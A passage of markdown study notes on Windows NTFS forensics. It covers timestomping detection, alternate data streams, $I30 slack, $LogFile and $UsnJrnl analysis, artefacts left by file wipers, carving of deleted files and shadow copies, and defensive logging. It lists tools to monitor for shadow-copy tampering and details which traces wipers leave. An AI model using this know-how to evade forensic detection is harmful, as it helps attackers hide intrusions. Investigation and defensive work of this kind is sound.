| 0xD0  | `$EA_INFORMATION`   |
| 0xE0  | `$EA`                |
| 0xF0  | `$LOGGED_UTILITY_STREAM` |
| 0x100 | `M`                  |




### MFT Entry Hex Overview

<img alt="MFT Entry Overiew" src="./files/MFT Entry Overview.png">




### istat - Analyzing File System Metadata

```bash
istat FILE_NAME.E01 [MFT_ENTRY_#]
```

- Displays statistics about a given metadata structure (inode), including MFT entries
- Supports dd, E01, VMDK/VHD
- Supports NTFS, FAT12/16/32 , ExFAT, EXT2/3/4, HFS, APFS
- Provides allocation status
- Includes MFT entry number
- $LogFile Sequence Number
- $STANDAR_INFORMATION
  - File or Folder attributes (ReadOnly, Hidden, Archived, etc.)
  - Security Information
  - USN Journal's Sequence Number
  - Timestamps
    - Created
    - Data Modified
    - MFT Metadata Modified
    - Data Last Accessed
- $FILENAME
  - File or Folder attributes (ReadOnly, Hidden, Archived, etc.)
  - Name of File or Directory
  - Contains parent directory MFT Entry
  - Four more timestamps
- Attribute List
  - The file has 2 $FN attributes
    - One for the long file name
    - Another for the short file name
    - One $DATA attribute



<img src="./files/Win11v22H2_File_Name_Rules.png" />

**NOTE:** the Timeline Rules are extracted from the `$FILE_NAME` attribute

**ANALYST NOTE:** The essential forensic indicator to look for is whether or not the `STANDARD_INFORMATION` and `$FILE_NAME` creation times match (possible indicator of **timestomping**)

### Detecting Timestamp Manipulation (Lethal DFIR Technique 🎯)
- Timestomping is common with attackers and malware authors to make their files hide in plain sight
- Artifacts from Timestomping vary based on the tool used


| ESSENTIAL ANOMALIES                                                              |
|-----------------------------------------------------------------------|
| `$STANDARD_INFORMATION` "B" time prior to `$FILE_NAME` "B" time         |
| Fractional second values are all zeros                               |
| `$STANDARD_INFORMATION` "M" time prior to ShimCache/Amcache timestamp |
| `$STANDARD_INFORMATION` times prior to executable's compile time     |
| `$STANDARD_INFORMATION` times prior to `$I30` slack entries            |
| USN Journal records contradict current creation timestamp               |
| MFT entry number is significantly out of sequence from expected range |


**ANALYST NOTE:** none of the anomaly checks above are full-proof, SO any deeper forensic investigation should be limited to reviewing files that have already been deemed suspicous!

### Timestomp Detection Analysis Process (Lethal Technique DFIR 🎯)


MTFECmd Extraction of `svchost.exe`

- **Created0x10** = `$STANDARD_INFORMATION (SI)`
  - Easily manipulated via WindowsAPI

- **Created0x30** = `$FILE_NAME (FN)`
  - More reliable


**CHECK 1**
<img src="./files/Timestop_Detection_Analysis.png">


`$SI` and `$FN` mismatch (`SI<FN` Column):
  - `$FILE_NAME` time more recent than `$STANDARD_INFORMATION` time

---

**CHECK 2**
<img src="./files/Zero-Fraction-Seconds.png">


Zero Fraction Seconds (`u Sec` Column)
  - Checks for zeroed out nano second value


---

**CHECK 3**
<img src="./files/CompileTime-vs-SI_Time.png">

`exiftool.exe` Time Stamp (.EXE Compile Time) Identification
- Parses application metadata
- Determine if **Time Stamp (.EXE Compile Time)** is > either **Creation or Modification time**


---

**CHECK 4**
<img src="./files/ShimCacheTime-vs-FileModTime.png">

`AppCompatCacheParser.exe` (ShimCache time) vs `exiftool.exe` (File Mod time)
- Generally, executables are rarely modified, so if ShimCache time ≠ File Mod time = **ANOMALOUS** and evidence of backdating
- **NOTE:** ShimCache Last Modified Times are very reliable!



### Analyzing $DATA
- File data is maintained by the $DATA attribute
  - Resident: If data is ~700 bytes or less, it gets stored inside the $DATA attribute
  - Non-resident: $DATA attribute lists the clusters on disk where the data resides
- Files can have multiple $DATA streams
  - The extra, or "Alternate Data Streams" (ADS), must be named



### Extracting Data with The Sleuth Kit - `icat`

```bash
icat [options] image inode > extracted.data
```  

`-r`: Recover deleted file
`-s`: Display slack space at end of file


- **Extract Data from a Metadata Address**
  - By default, the icat tool extracts data to STDOUT based on a specific metadata entry
  - Able to extract data from metadata entries marked deleted



- **Extracting NTFS $DATA streams**
  - With NTFS, the default will be to extract out the primary $DATA stream
  - To extract a different stream, such as an Alternate Data Stream, use syntax: `<mft#>-<AttributeType>-<AttributeID>` 

```bash
icat /cases/cdrive/hostname.E01 132646-128-5
```



### The Zone Identifier ADS -  Evidence of Download (Lethal DFIR Technique 🎯)

**ANALYST NOTE:** Zone Identifiers (ZoneIDs) can be used as an indicator to determine if a executable was downloaded from the Internet

| ZoneID Values |
|--------------|
| NoZone = -1  |
| MyComputer = 0|
| Intranet = 1  |
| Trusted = 2   |
| Internet = 3  |
| Untrusted = 4 |


#### Linux Live System


```bash
fls -r hostname.E01 | grep :.*:
```  
- Searching `.E01` image for any file that has a (`:`) followed by another (`:`)
- Copy the entire MFT record (`<mft#>-<AttributeType>-<AttributeID>`)


```bash
istat hostname.E01 <mft#>
```  

- Paste `mft#`
- Extracts all of the essential `$STANDARD_INFORMATION` and `$FILE_NAME` attributes
- Compare **Created** section for `$STANDARD_INFORMATION` and `$FILE_NAME`


```bash
icat hostname.E01 39345-128-9 > [YOUR_FILE]
``` 
- After confirming the information, redirect output into [YOUR_FILE]

```bash
file [YOUR_FILE]
```  

#### Windows Live System

```bash
dir /r
```
- Used to query alternate data streams from commandline

```bash
MFTECmd.exe -f 'E:\C\$MFT' --csv 'G:\' --csvf mft.csv
```

 - Open in TimelineExplorer
 - Filter "Has Ads" or "Is Ads"
 - Filter .exe
 - Note "Zone Id Contents" Column



### Filename Layer Analysis (Lethal DFIR Technique 🎯)
- Filenames potentially sotred in two places:
  - **File System Metadata**: MFT Entry|

  - **Directory Data**: contains list of children files/directories, will consume MFT records and contain `$STANDARD_INFORMATION` and `$FILE_NAME` attributes


- Most file wipping software does not wipe directory entries
- Analyze slack space of a directory, it will contain metadata including file names and timestamps
- Some forensic tools ignore directory slack entries



#### NTFS (New Technology File System) Directory Attributes
- Stored in an index named `$I30`
- Index composed of `$INDEX_ROOT` and optionally `$INDEX_ALLOCATION` attributes
  - `$INDEX_ROOT`: required (Stored in MFT), **always resident**
  - `$INDEX_ALLOCATION`: required for larger directories (stored in clusters), **always non-resident**



#### Parsing `$I30` Directory Indexes (Lethal DFIR Technique 🎯)

**Indx2Csv**
  - Parses out active and slack entries
  - Includes additional features for recovering partial entries

```bash
Indx2Csv /IndxFile:G:\cases\$I30 /OutputPath:G:\cases
```  
- Used for deep forensics to extract the `$I30` file and extract slack entries


**Velociraptor**
- Parses out active and slack entries
- Able to recurse the file system

```bash
Velociraptor artifacts collect Windows.NTFS.I30 --args DirectoryGlobs="F:\\Windows\\Temp\\Perfmon\\" --format=csv --nobanner > G:\output\I30-Perfmon.csv
```
- Can be used to extract slack files out of multiple directories 


### File System Jounraling Overview
- Records files system metadata changes
- Two files track these changes: \$LogFile and $UsnJrnl
- Primary goal is returning file system to a clean state
- Secondary goal is providing hints to applications about file changes
- Forensic examiners can use journals to identify prior state of files, and when their state changed
  - Like VSS, they serve as a time machine, detailing past file system activites
  - Unlike VSS the journals are rolling logs, rather than a point in time snapshot

**ANALYST NOTE:** 
- **$LogFile** = Full Packet Capture (detailed tracking of all changes occuring on a system)
- **$UsnJrnl** = NetFlow Logs (provides a summary of the data and longer time horizon)



### $LogFile Provides File System Resilience
- $LogFile stores low-level transactional logs for NTFS consistency
- Maintains very detailed information, including fill payload data to be recorded in MFT, Indexes, UsnJrnl, & more
- Tends to last just a dew hours on active systems
  - Secondary drives often last much longer (i.e. days)



### UsnJrnl
- Stores high-level summary information about changes to files & directories
- Used by applications to determine which files they should act upon
- Tends to last a few days on active systems
	- Secondary drives often last much longer (i.e., weeks)
- Stored in large $J ADS



### Common Activity Patterns in the Journals
- Due to the somwhat cryptic nature of the journals (particularly the $LogFile), interpretation often requires understanding activity patterns
- Below are several common activities on the file system and a reliable set of codes from the journals to signify their occurence (look for the combination of the codes to avoid false-positives)



| **Action** | **$LogFile Codes** | **$UsnJrnl Codes** |
| :---------------: | :---------------: | :---------------: |
|File/Directory Creation|AddIndexEntryAllocation  InitializeFileRecordSegment|FileCreate|
|File/Directory Deletion|DeleteIndexEntryAllocation  DeallocationFileRecordSegment|FileDelete|
|File/Directory Rename or Move|DeleteIndexEntryAllocation / AddIndexEntryAllocation|RenameOldName  RenameNewName|
|ADS Creation|CreateAttribute with name ending in ":ADS"|StreamChange  NamedDataExtend|
|File Data Modification|* Op codes for $LogFile are not sufficient to determine file modification|DataOverwrite \| DataExtend \| Data Truncation|

**NOTE:** Identification of File Data Modification isn't very useful within **$LogFiles**


#### $USN Journal Reason Codes

<img src="./files/USN_Journal_Reason_Codes.png">



#### $LogFile Operation Codes

<img src="./files/Log_File_Reason_Codes.png">



### Useful Filter and Searches in the Journals
- Parent directory filtering is a powerful technique with journal logs



| **Parent Directories to Filter** | **Investigative Relevance** |
| :---------------: | :---------------: |
|C:\Windows & C\Windows\System32|Directories coveted by attackers|
|C:\Windows\Prefetch|Attackers often delete prefetch files|
|Attacker's Working Directories|Discover unknown attacker tools and exfil|
|Temp Directories|Focus on executables|
|C:\Users&#92;*\Downloads|Find Recently Downloaded Files|
|C:\Users&#92;*\AppData\Roaming\Microsoft\Windows\Recent|Find additional times and files opened by users|
|C:&#92;$Recycle.Bin&#92;SID|Check for deleted files prior to Recycle Bin empty|



**File Types or Names of Interest Created or Recently Deleted**
- Executables (**.exe, .dll, .sys, .pyd**)
- Archives (**.rar, .zip, .cab, .7z**)
- Scripts (**.ps1, .vbs, .bat**)
- IOC file/directory names



### LogFileParser for $LogFile Analysis (Lethal DFIR Technique 🎯)

```bash
LogFileParser.exe /LogFileFile:E: \C\$LogFile /OutputPath:G: \ntfs-anti-forensics
```  
- Primary output file is "**LogFile.csv**"

**Contains the Following Details:**
  - `if_LSN`: Log Sequence Number (LSN) orders entries
  - `if_RedoOperation`: "Redo" operation is what it's about to do
  - `if_UndoOperation`: "Undo" is how to back it out
  - `if_FileName`: File or Directory name being updated
  - `if_CurrentAttribute`: Identifies which attributes are being changed
  - `if_TextInformation`: When applicable, provides pointers to payload data in supporting files


**Log File Parser Resources:**
- [LogFileParser](https://github.com/jschicht/LogFileParser)
- [\$MFT and $LogFile Analysis](https://tzworks.com/prototype_page.php?proto_id=46)
- [\$MFT and $Logfile Analysis User Guide (mala)](https://tzworks.com/prototypes/mala/mala.users.guide.pdf)



### MFTECmd for $UsnJrnl Analysis (Lethal DFIR Technique 🎯)

```bash
mftecmd.exe -f E:\C\$Extend\$J -m E:\C\$MFT --csv G:\[ntfs_folder] --csvf mftecmd-usnjrnl.csv
``` 
- `-f`: specifies and points at \$J (Journal) 
- `-m`: points at the Master File Table to correalate with MFT record mentioned in the Journal with the MFT to correlate timelines
- `--vss`: to have all volume shadow USN journals parsed automatically
- `--csvf`: used to ouptut the contents into a CSV located inside of `G:\[ntfs_folder]`

- Add -vss to have all volume shadow USN journals parsed automatically
  - **Name**: File/Directory Name
  - **Entry Number**: MFT #
  - **Parent Entry Number**: Parent MFT #
  - **Update Timestamp**: Update Timestamp
  - **Update Reasons**: Update Reason Code(s)
  - **Update Sequence Number**: Update Seq. Number
  - **File Attributes**: Attribute Flags



- [Windows Journal Parser (jp) Users Guide](https://tzworks.com/prototypes/jp/jp.users.guide.pdf)


#### Tips, Tricks, and Analysis



##### Timeline Explorer \$UsnJrnl Headings:
- Update Timestamp
- Parent Path
- Name
- File Attributes
- Entry Number
- Parent Entry Number
- Update Reasons

---

##### MFT Entry and Sequence Number

<img src="./files/MFT_Entry_and_Sequence_Number.png">


**NOTE:** `MFT Entry (Record) Numbers` are consistentily assigned and reused based on availability of a specific number. **HOWEVER,** the `Sequence Number` will iterate by **+1** as the type of the file changes allowing you to differentiate between files that share the same `MFT Entry Number`.

- See [File System Forensics](https://repo.zenk-security.com/Forensic/File%20System%20Forensic%20Analysis.pdf) for more information regarding NTFS and comprehensive file system analysis

---

##### Tracking Files With No Apparent Creating Time

- Track a specific file's use of an MFT entry by both its `Entry Number` and the `Sequence Number`
- Allows you to find all changes that have taken place to a file based on Sequence
- Directory movement/file renames within \$UsnJrnl
  - `RenameOldName` > `RenameNewName` 


---

##### Searching Sub-directories Within `Parent Entry Number`

- You utilize the `Entry (Record) Number` of directory that you want to search the contents off and input the unique Entry Number into the `Parent Entry Number` filter


---


### NTFS: What Happens When a File is Deleted?
- Data Layer
  - Clusters will be marked as unallocated in **$Bitmap**, but data will be left intact until clusters are reused
  - File data as well as slack space will still exist
- Metadata Layer
  - A single bit in the file's **$MFT** record is flipped, so all file metadata will remain until record is reused
  - **\$LogFile**, **$UsnJrnl**, and other system logs still reference file
- Filename Layer
  - **$File_Name** attribute is preserved until MFT record is reused
  - **$I30** index entry in parent directory may be preserved



## Advanced Evidence Recovery

- Popular Wipers
  - BleachBit
  - ERASER
  - SDelete
  - BCWipe



### SDelete
- Indicators (USNJrnl)
  - Name contains AAAAAAAA, BBBBBBBB, CCCCCCCC
  - Update Reasons: DataOverwrite, RenameOldNmae
  - Windows Search Index (gather) logs has indicators
  - $I30 Slack has indicators
  - Prefetch has indicators (files touch within 10 seconds of execution)



### BCWiper
- Renames files once with random name equal in size to original
- $UsnJrnl, $LogFile, and Evidence of Execution artifacts persist




### Eraser
- Includes an option to use a "legitamate" file name prior to final deletion
- Renamed MFT records (with ADS, if present), $I30 slack, $UsnJrnl, $LogFile, and Evidence of Execution artifacts persist



### Cipher
- Creates a persist directory name EFSTMPWP at the volume root and adds temp files within it to fill free space



### Registry Key/Value "Records" Recovery
- Registry hives have unallocated space similar to filesystems
- A deleted hive key is marked as unallocated; possible to recover
  - Keys
  - Values
  - Timestamps
- Eric Zimmerman's Registry Explorer makes recovering deleted registry data trivial



### Finding Fileless Malware in the Registry
- Attackers try ot hide amongst the noise in the registry
- Registry Explorer has convenient features to spot anomalies
- Detect Large Values
- Detect Base64 values



### File Recovery

**Metadata Method**
- When a file is deleted, its metadata is marked as unused, but metadata remains
- Read metadata entries that are marked as deleted and extract the data from any clusters it points to



**Carving Method**
- If the metadata entry has been resused, the data may still reside on disk, but we have to search for it
- Use known file signatures to find the start, then extract the data to a known file footer or to reasonable size limit



**Files to Target**
- Link Files
- Jumplists
- Recycle Bin
- Web History
- Prefetch
- Binaries
- Archives
- Office Docs
- CAD Drawings
- Email Stores
- Images
- Videos



### File Recovery via Metadata Method
- Extract deleted files individually with icat

```bash
icat -r <image> inode  
```

- Extract all deleted files with ```tsk_recover```  

```bash
tsk_recover <image> <output-directory>
```  

- Multiple forensic tools can locate MFT entries marked deleted and allow us to export (FTK Imager)



### File Recovery via Carving Method
- PhotoRec is an excellent free file carver
- Runs on Windows, Linux, and Mac
- Provides signatures for 300+ file types
- Leverages metadata from carved files
- [PhotoRec](https://www.cgsecurity.org/wiki/PhotoRec)



### Recovering Deleted Volume Shadow Copy Snapshots
- The ultimate files to recover -- VSS files
- Shadow copy files from the System Volume Information folder can be recovered
- vss_carver.py carves and recreates volumeshadow snapshots from disk images
- [Deleted Shadow Copies](http://www.kazamiya.net/en/DeletedSC)
- [Black Hat Presentation](https://i.blackhat.com/us-18/Thu-August-9/us-18-Kobayashi-Reconstruct-The-World-From-Vanished-Shadow-Recovering-Deleted-VSS-Snapshots.pdf)


---


**Step 1: Use vss_carver against the raw image**
```bash
vss_carver -t RAW -i /mnt/ewf_mount/ewf1 -o 0 -c ~/vsscarve-basefile/catalog -s ~/vsscarve-basefile/store
```  

---


**Step 2: Review (and possibly reorder) recovered VSCs**

```bash
vss_catalog_manipulator list ~/vsscarve-basefile/catalog
```  

---


**Step 3: Present recovered VSCs as raw disk images**

```bash
vshadowmount -o 0 -c ~/vsscarve-basefile/catalog -s ~/vsscarve-basefile/store /mnt/ewf_file/ewf1 /mnt/vsscarve_basefile/
```  

---


**Step 4: Mount all logical filesystems of snapshot**

```bash
cd /mnt/vsscarve_basefile/
```  
```bash 
for i in vss*; do mountwin $i /mnt/shadowcarve_basefile/$i; done
```


### Stream Carving for Event Log and File System Records
- Potential to recover several important record types
- NTFS:
  - MFT
  - $UsnJrnl
  - $I30
  - $ LogFile
- Event log EVTX records
- Bulk extractor is fast
  - bulk_extractor-rec
- [Bulk Extractor](https://github.com/simsong/bulk_extractor/wiki)
- [Bulk Extractor with Record Carving](https://www.kazamiya.net/en/bulk_extractor-rec)



### Carving for Strings


```bash
bstrings -f image.dd.001 --lr bitlocker # Uses preconfigured "bitlocker" regex pattern
```

- [bstrings](https://github.com/EricZimmerman/bstrings)
- [Autopsy Keyword Search and Indexing](https://www.sleuthkit.org/autopsy/keyword.php)



## Defensive Coutermeasures

### Leverage File System History
- Ensure Volume Snapshots are enabled
  - Disable "ScopeSnapshots"
  - Increase reserved size for snapshots
  - Consider VSC scheduled tasks to increase frequency
- Increase NTFS journal sizes:
  - $LogFile: default size is 64MB
  - $UsnJrnl: typical size is 32MB; some servers are 512MB
    - $UsnJrnl is preferred due to more efficient logging
- Monitor for suspicious file system activity
  - fsutil, vssadmin, wmic, shadowcopym win32_shadowcopy



### Level Up on Visibility
- Log
  - Forward
- Deploy enhanced logging configurations
  - PowerShell and Windows audit policy improvements
  - EDR technology such as sysmon
